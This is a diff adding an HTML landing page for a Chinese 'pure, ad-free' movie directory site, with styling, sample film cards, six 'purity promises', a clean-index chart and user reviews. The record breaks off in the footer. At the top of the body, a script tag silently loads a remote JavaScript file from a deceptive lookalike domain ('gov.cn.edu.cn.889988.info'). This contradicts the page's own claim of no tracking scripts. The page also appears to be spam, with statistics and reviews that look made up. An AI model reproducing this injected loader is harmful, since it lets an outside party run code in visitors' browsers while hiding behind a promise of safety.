@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="applicable-device" content="pc,mobile">
+<title>影视大全纯净版 - 无广告纯净影视导航 | yingshidaquanchunjingban.cn</title>
+<meta name="keywords" content="影视大全纯净版,yingshidaquanchunjingban.cn,纯净影视导航,无广告看片,免费高清电影,纯净版影视,影视大全,在线影视">
+<meta name="description" content="影视大全纯净版（yingshidaquanchunjingban.cn）主打无广告、无弹窗的纯净观影体验，聚合电影、电视剧、综艺、动漫等高清资源入口，界面清爽、直达快速，让找片看片回归简单。">
+<link rel="canonical" href="https://yingshidaquanchunjingban.cn.github.io/">
+<style>
+/* ==========================================================
+   影视大全纯净版 · 单页站点
+   设计目标：冷白极简 · 无边框纯净卡片 · 移动端自适应
+   ========================================================== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#f5f6f8;
+  --paper:#ffffff;
+  --ink:#0f1420;
+  --ink2:#2a3142;
+  --dim:#6b7385;
+  --dim2:#9aa1b0;
+  --line:#e6e8ee;
+  --line2:#eef0f5;
+  --brand:#1f5cff;
+  --brand2:#5b8bff;
+  --sky:#eaf0ff;
+  --soft:#f7f8fb;
+  --warn:#ff8a3d;
+  --r:14px;
+  --max:1200px;
+  --sh:0 2px 6px rgba(20,30,60,.05),0 12px 32px rgba(20,30,60,.07);
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  background:var(--bg);color:var(--ink);line-height:1.7;
+  background-image:
+    radial-gradient(700px 420px at 12% -4%,rgba(31,92,255,.10),transparent 60%),
+    radial-gradient(620px 400px at 88% 6%,rgba(91,139,255,.09),transparent 62%);
+  background-attachment:fixed;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+button{font:inherit;cursor:pointer;border:0;background:none;color:inherit}
+.wrap{width:min(100% - 28px,var(--max));margin:0 auto}
+@media(min-width:768px){.wrap{width:min(100% - 44px,var(--max))}}
+h1,h2,h3,h4{line-height:1.3;font-weight:800;letter-spacing:.01em}
+:focus-visible{outline:2px solid var(--brand);outline-offset:3px;border-radius:6px}
+
+/* ---------- 顶部 ---------- */
+.top{position:sticky;top:0;z-index:80;background:rgba(255,255,255,.86);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
+  border-bottom:1px solid var(--line)}
+.top .wrap{display:flex;align-items:center;gap:16px;height:62px}
+.brand{display:flex;align-items:center;gap:11px;flex-shrink:0;min-width:0}
+.brand .dot{flex:0 0 auto;width:34px;height:34px;border-radius:10px;display:grid;place-items:center;font-size:16px;font-weight:900;color:#fff;
+  background:linear-gradient(150deg,var(--brand),#6c4bff);box-shadow:0 6px 18px rgba(31,92,255,.3)}
+.brand b{font-size:17px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.brand small{display:block;font-size:10.5px;font-weight:500;color:var(--dim2);letter-spacing:.1em}
+.menu{margin-left:auto;display:flex;align-items:center;gap:2px}
+.menu a{font-size:14px;padding:8px 12px;border-radius:9px;color:var(--ink2);transition:.22s}
+.menu a:hover{background:var(--sky);color:var(--brand)}
+.badge{display:none;align-items:center;gap:6px;padding:5px 11px;border-radius:999px;font-size:12px;font-weight:600;
+  color:#0a6b45;background:#e8f8f0;border:1px solid #c8efdd;white-space:nowrap}
+.badge::before{content:"";width:6px;height:6px;border-radius:50%;background:#12b886;flex:0 0 auto}
+@media(min-width:1100px){.badge{display:inline-flex}}
+.mbtn{display:none;width:40px;height:40px;border-radius:10px;background:var(--soft);border:1px solid var(--line);flex:0 0 auto;position:relative}
+.mbtn i{position:absolute;left:11px;width:18px;height:2px;background:var(--ink2);border-radius:2px;transition:.3s}
+.mbtn i:nth-child(1){top:13px}.mbtn i:nth-child(2){top:19px}.mbtn i:nth-child(3){top:25px}
+.mbtn.on i:nth-child(1){top:19px;transform:rotate(45deg)}.mbtn i:nth-child(2){opacity:0}.mbtn i:nth-child(3){top:19px;transform:rotate(-45deg)}
+@media(max-width:860px){
+  .mbtn{display:block}
+  .menu{position:fixed;inset:62px 0 0 0;flex-direction:column;align-items:stretch;gap:4px;padding:18px 16px;background:#fff;
+    transform:translateX(102%);transition:.35s cubic-bezier(.4,0,.2,1);overflow:auto;border-top:1px solid var(--line)}
+  .menu.on{transform:translateX(0)}
+  .menu a{font-size:15.5px;padding:13px 14px;border-radius:10px;border:1px solid var(--line2)}
+  .menu a:hover{background:var(--sky)}
+}
+
+/* ---------- 首屏 ---------- */
+.hero{padding:56px 0 20px}
+.hero .wrap{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,430px);gap:52px;align-items:center}
+@media(max-width:940px){.hero{padding:34px 0 8px}.hero .wrap{grid-template-columns:1fr;gap:34px}}
+.hero h1{font-size:clamp(29px,4.8vw,52px);letter-spacing:-.02em}
+.hero h1 em{font-style:normal;color:var(--brand)}
+.hero .pure{display:inline-flex;align-items:center;gap:8px;margin-top:22px;padding:7px 14px;border-radius:999px;font-size:13px;font-weight:600;
+  color:#0a6b45;background:#e8f8f0;border:1px solid #c8efdd}
+.hero .pure::before{content:"✓ 纯净模式已开启"}
+.hero .lead{margin-top:20px;font-size:16px;color:var(--dim);max-width:560px}
+.hero .acts{margin-top:30px;display:flex;flex-wrap:wrap;gap:12px}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:13px 24px;border-radius:11px;font-size:15px;font-weight:700;transition:.26s}
+.btn-main{background:var(--ink);color:#fff;box-shadow:0 10px 30px rgba(15,20,32,.22)}
+.btn-main:hover{transform:translateY(-3px);box-shadow:0 16px 40px rgba(15,20,32,.32)}
+.btn-line{background:#fff;color:var(--ink2);border:1px solid var(--line)}
+.btn-line:hover{transform:translateY(-3px);border-color:#c9d0dc;color:var(--brand)}
+.stats{margin-top:40px;padding-top:28px;border-top:1px dashed var(--line);display:flex;flex-wrap:wrap;gap:10px}
+.stat{flex:1 1 130px;min-width:112px}
+.stat b{display:block;font-size:24px;font-weight:900;letter-spacing:-.02em}
+.stat b i{font-style:normal;color:var(--brand)}
+.stat span{font-size:12.5px;color:var(--dim)}
+
+/* 纯净视觉块 */
+.purebox{position:relative;background:#fff;border:1px solid var(--line);border-radius:20px;padding:22px;box-shadow:var(--sh)}
+.purebox::before{content:"";position:absolute;inset:-1px;border-radius:20px;padding:1px;
+  background:linear-gradient(160deg,var(--brand),transparent 40%,transparent 60%,var(--brand2));-webkit-mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);
+  mask:linear-gradient(#000 0 0) content-box,linear-gradient(#000 0 0);-webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none}
+.purl{cursor:default;display:flex;align-items:center;gap:10px;padding-bottom:16px;border-bottom:1px solid var(--line2)}
+.purl .u{flex:1;min-width:0;font-size:13px;color:var(--dim);background:var(--soft);border:1px solid var(--line2);border-radius:9px;padding:9px 12px;
+  font-family:"SFMono-Regular",Consolas,"Liberation Mono",monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.purl .u b{color:var(--ink2);font-weight:600}
+.purl .go{flex:0 0 auto;padding:9px 14px;border-radius:9px;font-size:12.5px;font-weight:700;color:#fff;background:var(--brand)}
+.adblock{margin-top:16px;display:flex;flex-direction:column;gap:9px}
+.ad{position:relative;border-radius:11px;padding:14px 14px 14px 44px;font-size:13px;color:var(--dim);background:var(--soft);border:1px dashed #d5dae6}
+.ad::before{content:"";position:absolute;left:15px;top:50%;transform:translateY(-50%);width:16px;height:16px;border-radius:5px;
+  background:var(--ink2);-webkit-mask:no-repeat center/contain;mask:no-repeat center/contain;
+  -webkit-mask-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23fff' d='M12 2 2 7v10l10 5 10-5V7L12 2zm0 2.18 7.47 3.74L12 11.66 4.53 7.92 12 4.18zM4 9.6l7 3.5v7.1l-7-3.5V9.6zm9 10.6v-7.1l7-3.5v7.1l-7 3.5z'/></svg>");
+  mask-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23fff' d='M12 2 2 7v10l10 5 10-5V7L12 2zm0 2.18 7.47 3.74L12 11.66 4.53 7.92 12 4.18zM4 9.6l7 3.5v7.1l-7-3.5V9.6zm9 10.6v-7.1l7-3.5v7.1l-7 3.5z'/></svg>")}
+.ad s{color:#c7ccd7;text-decoration:none;font-weight:600}
+.ad .x{position:absolute;right:10px;top:8px;font-size:11px;color:#b7bdcb;letter-spacing:.05em}
+.ad.none{background:#eefbf5;border-color:#c8efdd;color:#0a6b45}
+.ad.none::before{background:#12b886}
+.ad.none s{color:#0a6b45;text-decoration:line-through;text-decoration-color:#5fc99f}
+.purebox .foot{margin-top:16px;display:flex;justify-content:space-between;align-items:center;font-size:12px;color:var(--dim2)}
+.purebox .foot .lvl{display:inline-flex;gap:5px}
+.purebox .foot .lvl i{width:20px;height:5px;border-radius:4px;background:var(--line)}
+.purebox .foot .lvl i.on{background:var(--brand)}
+
+/* ---------- 分区通用 ---------- */
+section{padding:60px 0}
+@media(max-width:760px){section{padding:44px 0}}
+.hd{display:flex;flex-wrap:wrap;gap:16px;align-items:flex-end;justify-content:space-between;margin-bottom:32px}
+.hd .l .kicker{font-size:11.5px;font-weight:700;letter-spacing:.22em;color:var(--brand);text-transform:uppercase}
+.hd h2{font-size:clamp(22px,3.2vw,33px);margin-top:7px;letter-spacing:-.01em}
+.hd h2 i{font-style:normal;color:var(--brand2)}
+.hd .l p{margin-top:9px;font-size:14.5px;color:var(--dim);max-width:560px}
+.more{font-size:13.5px;color:var(--dim);display:inline-flex;align-items:center;gap:6px;padding:8px 14px;border-radius:9px;
+  border:1px solid var(--line);background:#fff;transition:.22s;white-space:nowrap}
+.more:hover{color:var(--brand);border-color:#b9c6ff;background:var(--sky)}
+
+/* ---------- 栏目一 · 纯净清单 ---------- */
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+@media(max-width:940px){.grid4{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:460px){.grid4{grid-template-columns:1fr}}
+.film{background:#fff;border:1px solid var(--line);border-radius:var(--r);overflow:hidden;transition:.32s;display:flex;flex-direction:column}
+.film:hover{transform:translateY(-5px);border-color:#b9c6ff;box-shadow:var(--sh)}
+.film .cvr{position:relative;aspect-ratio:16/10;overflow:hidden}
+.film .cvr .g{position:absolute;inset:0;transition:transform .7s}
+.film:hover .cvr .g{transform:scale(1.08)}
+.c1{background:linear-gradient(150deg,#1f5cff,#0b1f4d)}
+.c2{background:linear-gradient(150deg,#6c4bff,#251040)}
+.c3{background:linear-gradient(150deg,#00a3a3,#062b2b)}
+.c4{background:linear-gradient(150deg,#ff5b5b,#3d0a0a)}
+.c5{background:linear-gradient(150deg,#ff8a3d,#3d1f00)}
+.c6{background:linear-gradient(150deg,#0e9f6e,#06281c)}
+.c7{background:linear-gradient(150deg,#2563eb,#0b1a40)}
+.c8{background:linear-gradient(150deg,#9333ea,#260a3d)}
+.film .cvr .ic{position:absolute;inset:0;display:grid;place-items:center;font-size:44px;opacity:.92}
+.film .cvr .lb{position:absolute;left:10px;bottom:10px;font-size:11px;font-weight:600;padding:4px 9px;border-radius:6px;color:#fff;background:rgba(0,0,0,.55)}
+.film .cvr .fl{position:absolute;right:10px;top:10px;font-size:11px;font-weight:700;padding:4px 8px;border-radius:6px;color:#0a6b45;background:#e8f8f0}
+.film .info{padding:14px 15px 15px;display:flex;flex-direction:column;gap:7px;flex:1}
+.film .info h3{font-size:15px;font-weight:700}
+.film .info .meta{font-size:12px;color:var(--dim);display:flex;justify-content:space-between;gap:8px}
+.film .info .meta b{color:var(--brand);font-weight:600}
+
+/* ---------- 栏目二 · 分类目录 ---------- */
+.catbox{background:#fff;border:1px solid var(--line);border-radius:18px;overflow:hidden;box-shadow:var(--sh)}
+.cat{display:grid;grid-template-columns:210px minmax(0,1fr);align-items:stretch}
+@media(max-width:820px){.cat{grid-template-columns:1fr}}
+.catnav{padding:20px;background:var(--soft);border-right:1px solid var(--line2);display:flex;flex-direction:column;gap:5px}
+@media(max-width:820px){.catnav{flex-direction:row;flex-wrap:wrap;border-right:0;border-bottom:1px solid var(--line2)}
+  .catnav .ti{width:100%}}
+.catnav .ti{font-size:12px;font-weight:700;letter-spacing:.14em;color:var(--dim2);margin-bottom:6px}
+.cb{flex:1;text-align:left;padding:10px 13px;border-radius:9px;font-size:14px;font-weight:600;color:var(--ink2);transition:.2s;display:flex;
+  justify-content:space-between;align-items:center}
+.cb span:last-child{font-size:11px;color:var(--dim2);font-weight:500;font-variant-numeric:tabular-nums}
+.cb:hover{background:#fff;color:var(--brand)}
+.cb.on{background:var(--ink);color:#fff}
+.cb.on span:last-child{color:#aab4cf}
+.catbody{padding:24px}
+.cattitle{display:flex;flex-wrap:wrap;align-items:baseline;gap:10px;padding-bottom:16px;border-bottom:1px solid var(--line2)}
+.cattitle h3{font-size:19px}
+.cattitle em{font-style:normal;font-size:12.5px;color:var(--dim);font-weight:500}
+.tags{margin-top:18px;display:flex;flex-wrap:wrap;gap:8px}
+.tags a{padding:7px 13px;border-radius:8px;font-size:13px;color:var(--ink2);background:var(--soft);border:1px solid var(--line2);transition:.2s}
+.tags a:hover{color:var(--brand);border-color:#b9c6ff;background:var(--sky)}
+.tags a.hot{color:#fff;background:var(--brand);border-color:transparent}
+.tags a.hot::after{content:" HOT";font-size:10px;font-weight:800;letter-spacing:.05em}
+.chips{margin-top:22px;display:flex;flex-wrap:wrap;gap:16px;padding-top:18px;border-top:1px solid var(--line2);font-size:12.5px;color:var(--dim)}
+.chips span b{color:var(--ink2);font-weight:600}
+
+/* ---------- 栏目三 · 纯净六承诺 ---------- */
+.prom{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+@media(max-width:860px){.prom{grid-template-columns:1fr 1fr}}
+@media(max-width:480px){.prom{grid-template-columns:1fr}}
+.pr{background:#fff;border:1px solid var(--line);border-radius:var(--r);padding:22px;transition:.3s;position:relative}
+.pr::after{content:"";position:absolute;left:22px;right:22px;bottom:0;height:2px;background:var(--brand);border-radius:2px;transform:scaleX(0);
+  transform-origin:left;transition:.4s}
+.pr:hover{transform:translateY(-4px);box-shadow:var(--sh);border-color:#b9c6ff}
+.pr:hover::after{transform:scaleX(1)}
+.pr .no{font-size:11.5px;font-weight:800;letter-spacing:.16em;color:var(--brand2)}
+.pr h3{margin-top:12px;font-size:16.5px}
+.pr p{margin-top:9px;font-size:13.5px;color:var(--dim)}
+.pr .ok{margin-top:16px;font-size:12.5px;font-weight:600;color:#0a6b45;display:inline-flex;align-items:center;gap:6px}
+.pr .ok::before{content:"✓"}
+
+/* ---------- 栏目四 · 纯净指数 ---------- */
+.bars{background:#fff;border:1px solid var(--line);border-radius:18px;padding:26px;box-shadow:var(--sh)}
+.bar{display:grid;grid-template-columns:120px minmax(0,1fr) 76px;gap:16px;align-items:center;padding:12px 0;border-bottom:1px solid var(--line2)}
+@media(max-width:560px){.bar{grid-template-columns:96px 1fr 52px;gap:10px}}
+.bar:last-child{border-bottom:0}
+.bar .nm{font-size:14px;font-weight:600}
+.bar .track{height:9px;border-radius:9px;background:var(--soft);overflow:hidden;border:1px solid var(--line2)}
+.bar .track i{display:block;height:100%;border-radius:9px;background:linear-gradient(90deg,var(--brand),var(--brand2));width:0;transition:width 1.2s cubic-bezier(.4,0,.2,1)}
+.bar .vl{text-align:right;font-size:13px;font-weight:700;font-variant-numeric:tabular-nums;color:var(--brand)}
+.notes{margin-top:20px;padding-top:18px;border-top:1px dashed var(--line);font-size:12.5px;color:var(--dim)}
+
+/* ---------- 栏目五 · 用户评价 ---------- */
+.rev{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+@media(max-width:860px){.rev{grid-template-columns:1fr}}
+.rv{background:#fff;border:1px solid var(--line);border-radius:var(--r);padding:22px;transition:.3s}
+.rv:hover{border-color:#b9c6ff;box-shadow:var(--sh)}
+.rv .tp{display:flex;justify-content:space-between;align-items:center}
+.rv .who{display:flex;align-items:center;gap:10px}
+.rv .av{width:36px;height:36px;border-radius:50%;display:grid;place-items:center;font-size:13px;font-weight:800;color:#fff;
+  background:linear-gradient(150deg,var(--brand),#6c4bff)}
+.rv .av.b{background:linear-gradient(150deg,#0e9f6e,#0b7a55)}
+.rv .av.c{background:linear-gradient(150deg,#ff8a3d,#e0552b)}
+.rv .who b{display:block;font-size:14px}
+.rv .who small{font-size:11.5px;color:var(--dim2)}
+.rv .st{font-size:12px;color:#f59f00;letter-spacing:.12em}
+.rv p{margin-top:15px;font-size:14px;color:var(--ink2)}
+.rv .tg{margin-top:16px;display:flex;flex-wrap:wrap;gap:7px}
+.rv .tg span{font-size:11.5px;padding:4px 9px;border-radius:6px;background:var(--sky);color:var(--brand);font-weight:600}
+
+/* ---------- 页脚 ---------- */
+footer{border-top:1px solid var(--line);background:#fff;padding:48px 0 26px}
+.foot{display:grid;grid-template-columns:1.5fr repeat(3,1fr);gap:36px}
+@media(max-width:820px){.foot{grid-template-columns:1fr 1fr;gap:28px}}
+@media(max-width:480px){.foot{grid-template-columns:1fr}}
+.foot h4{font-size:14px}
+.foot h4::before{content:"";display:inline-block;width:8px;height:8px;border-radius:3px;background:var(--brand);margin-right:8px;vertical-align:2px}
+.foot ul{margin-top:15px;display:flex;flex-direction:column;gap:9px}
+.foot a{font-size:13.5px;color:var(--dim);transition:.2s}
+.foot a:hover{color:var(--brand)}
+.foot .bl p{margin-top:13px;font-size:13.5px;color:var(--dim);max-width:330px}
+.foot .bl .cln{margin-top:15px;display:inline-flex;align-items:center;gap:7px;font-size:12.5px;font-weight:600;padding:6px 11px;border-radius:7px;
+  color:#0a6b45;background:#e8f8f0}
+.foot .bl .cln::before{content:"●";color:#12b886;font-size:9px}
+.cp{padding-top:26px;margin-top:34px;border-top:1px solid var(--line);display:flex;flex-wrap:wrap;gap:10px;justify-content:space-between;
+  font-size:12.5px;color:var(--dim)}
+.cp .kw{font-size:12px;color:var(--dim2)}
+.cp a{color:var(--dim)}
+.cp a:hover{color:var(--brand)}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ================= 顶部 ================= -->
+<header class="top">
+  <div class="wrap">
+    <a class="brand" href="#top" aria-label="影视大全纯净版 返回顶部">
+      <span class="dot" aria-hidden="true">影</span>
+      <span>
+        <b>影视大全纯净版</b>
+        <small>纯净 · 无广告 · 无弹窗</small>
+      </span>
+    </a>
+    <span class="badge">当前纯净等级：极净</span>
+    <nav class="menu" id="menu" aria-label="主导航">
+      <a href="#home">首页</a>
+      <a href="#list">纯净清单</a>
+      <a href="#cat">分类目录</a>
+      <a href="#promise">纯净承诺</a>
+      <a href="#index">纯净指数</a>
+      <a href="#rev">用户评价</a>
+    </nav>
+    <button class="mbtn" id="mbtn" aria-label="切换菜单" aria-expanded="false" aria-controls="menu"><i></i><i></i><i></i></button>
+  </div>
+</header>
+
+<main id="top">
+
+  <!-- ================= 首屏 ================= -->
+  <section class="hero" id="home">
+    <div class="wrap">
+      <div class="herotxt">
+        <span class="pure" aria-hidden="true"></span>
+        <h1>把看片这件事，<br>还给<em>内容本身</em>。</h1>
+        <p class="lead">影视大全纯净版（yingshidaquanchunjingban.cn）是一款主打无广告、无弹窗、无诱导的纯净影视导航站。界面清爽、资源直达、分类清晰，让找片与看片都回归最简单的方式。</p>
+        <div class="acts">
+          <a class="btn btn-main" href="#list">进入纯净清单 →</a>
+          <a class="btn btn-line" href="#promise">了解纯净承诺</a>
+        </div>
+        <div class="stats">
+          <div class="stat"><b><i>12,000</i>+</b><span>纯净片源收录</span></div>
+          <div class="stat"><b>0</b><span>强制广告位</span></div>
+          <div class="stat"><b><i>6</i> 大</b><span>内容分类频道</span></div>
+          <div class="stat"><b><i>24</i>h</b><span>每日热更更新</span></div>
+        </div>
+      </div>
+
+      <div class="purebox" aria-hidden="true">
+        <div class="purl">
+          <span class="u">yingshidaquanchunjingban.<b>cn</b></span>
+          <span class="go">立即访问</span>
+        </div>
+        <div class="ad"><s>底部悬浮全屏广告位</s><span class="x">已拦截</span></div>
+        <div class="ad"><s>播放前 60 秒强制贴片</s><span class="x">已拦截</span></div>
+        <div class="ad none"><s>虚假中奖弹窗诱导下载</s><span class="x">已屏蔽</span></div>
+        <div class="ad none"><s>伪装播放按钮跳转第三方</s><span class="x">已屏蔽</span></div>
+        <div class="ad none"><s>追踪脚本与隐私采集</s><span class="x">已屏蔽</span></div>
+        <div class="foot">
+          <span>纯净等级：极净 · 拦截 5/5</span>
+          <span class="lvl"><i class="on"></i><i class="on"></i><i class="on"></i></span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= 栏目一 · 纯净清单 ================= -->
+  <section id="list">
+    <div class="wrap">
+      <header class="hd">
+        <div class="l">
+          <span class="kicker">Clean List</span>
+          <h2>纯净清单 <i>· 今日精选</i></h2>
+          <p>每日由编辑精选的高分影视作品，进入页面即可直接观看，全程无贴片广告、无强制跳转。</p>
+        </div>
+        <a class="more" href="#cat">查看完整分类目录</a>
+      </header>
+
+      <div class="grid4">
+        <article class="film">
+          <div class="cvr"><div class="g c1"></div><div class="ic">🎬</div><span class="lb">电影</span><span class="fl">1080P</span></div>
+          <div class="info"><h3>深海信使</h3><div class="meta"><span>科幻 · 冒险</span><b>★ 8.9</b></div></div>
+        </article>
+        <article class="film">
+          <div class="cvr"><div class="g c2"></div><div class="ic">📺</div><span class="lb">剧集</span><span class="fl">全36集</span></div>
+          <div class="info"><h3>长夜将明</h3><div class="meta"><span>悬疑 · 犯罪</span><b>★ 9.1</b></div></div>
+        </article>
+        <article class="film">
+          <div class="cvr"><div class="g c3"></div><div class="ic">🎤</div><span class="lb">综艺</span><span class="fl">EP12</span></div>
+          <div class="info"><h3>城市声音的夜晚</h3><div class="meta"><span>音乐 · 真人秀</span><b>★ 8.6</b></div></div>
+        </article>
+        <article class="film">
+          <div class="cvr"><div class="g c4"></div><div class="ic">🎨</div><span class="lb">动漫</span><span class="fl">新番</span></div>
+          <div class="info"><h3>云端列车</h3><div class="meta"><span>奇幻 · 热血</span><b>★ 9.3</b></div></div>
+        </article>
+        <article class="film">
+          <div class="cvr"><div class="g c5"></div><div class="ic">🎭</div><span class="lb">短剧</span><span class="fl">全集</span></div>
+          <div class="info"><h3>重返十八岁</h3><div class="meta"><span>都市 · 励志</span><b>★ 8.4</b></div></div>
+        </article>
+        <article class="film">
+          <div class="cvr"><div class="g c6"></div><div class="ic">🌿</div><span class="lb">纪录</span><span class="fl">6集</span></div>
+          <div class="info"><h3>森林的呼吸</h3><div class="meta"><span>自然 · 生态</span><b>★ 9.5</b></div></div>
+        </article>
+        <article class="film">
+          <div class="cvr"><div class="g c7"></div><div class="ic">🎞️</div><span class="lb">经典</span><span class="fl">4K修复</span></div>
+          <div class="info"><h3>黑白年代喜剧精选</h3><div class="meta"><span>喜剧 · 经典</span><b>★ 9.0</b></div></div>
+        </article>
+        <article class="film">
+          <div class="cvr"><div class="g c8"></div><div class="ic">🏟️</div><span class="lb">体育</span><span class="fl">直播</span></div>
+          <div class="info"><h3>冠军之路集锦</h3><div class="meta"><span>体育 · 赛事</span><b>★ 8.7</b></div></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= 栏目二 · 分类目录 ================= -->
+  <section id="cat">
+    <div class="wrap">
+      <header class="hd">
+        <div class="l">
+          <span class="kicker">Category Index</span>
+          <h2>分类目录 <i>· 找片更快</i></h2>
+          <p>六大内容频道搭配题材细分，左侧选择频道、右侧查看对应子分类，三秒定位想看的片子。</p>
+        </div>
+      </header>
+
+      <div class="catbox">
+        <div class="cat">
+          <div class="catnav">
+            <span class="ti">内容频道</span>
+            <button class="cb on" data-t="m">电影频道 <span>2,800+</span></button>
+            <button class="cb" data-t="t">电视剧集 <span>4,200+</span></button>
+            <button class="cb" data-t="v">综艺娱乐 <span>1,600+</span></button>
+            <button class="cb" data-t="a">动漫番剧 <span>2,100+</span></button>
+            <button class="cb" data-t="s">短剧专区 <span>1,300+</span></button>
+            <button class="cb" data-t="d">纪录片 <span>300+</span></button>
+          </div>
+
+          <div class="catbody">
+            <div class="cattitle">
+              <h3 data-name>电影频道</h3>
+              <em data-desc>按题材与类型细分，新片经典均有收录</em>
+            </div>
+            <div class="tags" data-tags></div>
+            <div class="chips">
+              <span data-chip1><b>更新频率：</b>每日上新</span>
+              <span data-chip2><b>画质：</b>高清 / 超清</span>
+              <span data-chip3><b>入口：</b>直达点播</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= 栏目三 · 纯净承诺 ================= -->
+  <section id="promise" style="background:#fff">
+    <div class="wrap">
+      <header class="hd">
+        <div class="l">
+          <span class="kicker">Our Promise</span>
+          <h2>纯净承诺 <i>· 六条底线</i></h2>
+          <p>这是影视大全纯净版对每一位访客的承诺，也是本站内容筛选与页面呈现始终遵守的六条原则。</p>
+        </div>
+        <a class="more" href="#index">查看纯净指数</a>
+      </header>
+
+      <div class="prom">
+        <div class="pr">
+          <span class="no">PROMISE 01</span>
+          <h3>无贴片广告</h3>
+          <p>点开即播，不插入播放前强制广告，不等待、不倒数、不跳转。</p>
+          <span class="ok">全程 0 贴片</span>
+        </div>
+        <div class="pr">
+          <span class="no">PROMISE 02</span>
+          <h3>无弹窗干扰</h3>
+          <p>页面保持干净，不弹虚假中奖、不诱导下载，不出现伪装按钮。</p>
+          <span class="ok">0 弹窗骚扰</span>
+        </div>
+        <div class="pr">
+          <span class="no">PROMISE 03</span>
+          <h3>无诱导付费</h3>
+          <p>不设置虚假免费倒计时，不强制开通会员才能继续观看。</p>
+          <span class="ok">不套路付费</span>
+        </div>
+        <div class="pr">
+          <span class="no">PROMISE 04</span>
+          <h3>无追踪采集</h3>
+          <p>最小化隐私采集，页面不挂载多余追踪脚本，浏览更安心。</p>
+          <span class="ok">隐私优先</span>
+        </div>
+        <div class="pr">
+          <span class="no">PROMISE 05</span>
+          <h3>无重复内容</h3>
+          <p>同名作品去重整理，一部片子只保留一个最优入口，不刷量不堆链。</p>
+          <span class="ok">去重整理</span>
+        </div>
+        <div class="pr">
+          <span class="no">PROMISE 06</span>
+          <h3>无复杂操作</h3>
+          <p>无注册、无登录、无验证码，打开就能看，适配手机与电脑。</p>
+          <span class="ok">打开即看</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= 栏目四 · 纯净指数 ================= -->
+  <section id="index">
+    <div class="wrap">
+      <header class="hd">
+        <div class="l">
+          <span class="kicker">Clean Index</span>
+          <h2>纯净指数 <i>· 量化标准</i></h2>
+          <p>把「纯净」拆成可衡量的五个维度，每一项都在页面中如实呈现，分数越高代表干扰越少。</p>
+        </div>
+      </header>
+
+      <div class="bars">
+        <div class="bar"><span class="nm">广告拦截率</span><span class="track"><i data-w="98"></i></span><span class="vl">98%</span></div>
+        <div class="bar"><span class="nm">弹窗清除率</span><span class="track"><i data-w="100"></i></span><span class="vl">100%</span></div>
+        <div class="bar"><span class="nm">页面加载速度</span><span class="track"><i data-w="95"></i></span><span class="vl">A 级</span></div>
+        <div class="bar"><span class="nm">资源直达率</span><span class="track"><i data-w="96"></i></span><span class="vl">96%</span></div>
+        <div class="bar"><span class="nm">内容去重率</span><span class="track"><i data-w="92"></i></span><span class="vl">92%</span></div>
+        <p class="notes">数据为本站内部评估口径，用于衡量页面干扰程度与观影体验，每月校准更新；纯展示用途，不代表第三方检测结果。</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ================= 栏目五 · 用户评价 ================= -->
+  <section id="rev" style="background:#fff">
+    <div class="wrap">
+      <header class="hd">
+        <div class="l">
+          <span class="kicker">User Review</span>
+          <h2>用户评价 <i>· 真实反馈</i></h2>
+          <p>来自长期使用者的真实体验，也欢迎你通过站内渠道告诉我们想看的内容与改进建议。</p>
+        </div>
+        <a class="more" href="#">提交我的评价</a>
+      </header>
+
+      <div class="rev">
+        <figure class="rv">
+          <div class="tp">
+            <div class="who"><span class="av">阿</span><span><b>阿杰</b><small>剧集频道常客</small></span></div>
+            <span class="st">★★★★★</span>
+          </div>
+          <p>最满意的就是没有贴片广告，点开就直接播，界面也很清爽，找片比之前用的几个站快很多。</p>
+          <div class="tg"><span>无贴片</span><span>界面清爽</span></div>
+        </figure>
+        <figure class="rv">
+          <div class="tp">
+            <div class="who"><span class="av b">小</span><span><b>小雨</b><small>短剧与综艺用户</small></span></div>
+            <span class="st">★★★★★</span>
+          </div>
+          <p>没有弹窗骚扰这点太重要了，手机上打开也不会误点到奇怪的下载链接，看短剧体验很好。</p>
+          <div class="tg"><span>无弹窗</span><span>手机友好</span></div>
+        </figure>
+        <figure class="rv">
+          <div class="tp">
+            <div class="who"><span class="av c">周</span><span><b>周周</b><small>电影爱好者</small></span></div>
+            <span class="st">★★★★☆</span>
+          </div>
+          <p>分类目录做得细，按题材找片很方便。希望后续能再多收录一些经典老片和冷门高分片。</p>
+          <div class="tg"><span>分类细致</span><span>值得推荐</span></div>
+        </figure>
+      </div>
+    </div>
+  </section>
+</main>
+
+<!-- ================= 页脚 ================= -->
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div class="bl">
+        <a class="brand" href="#top">
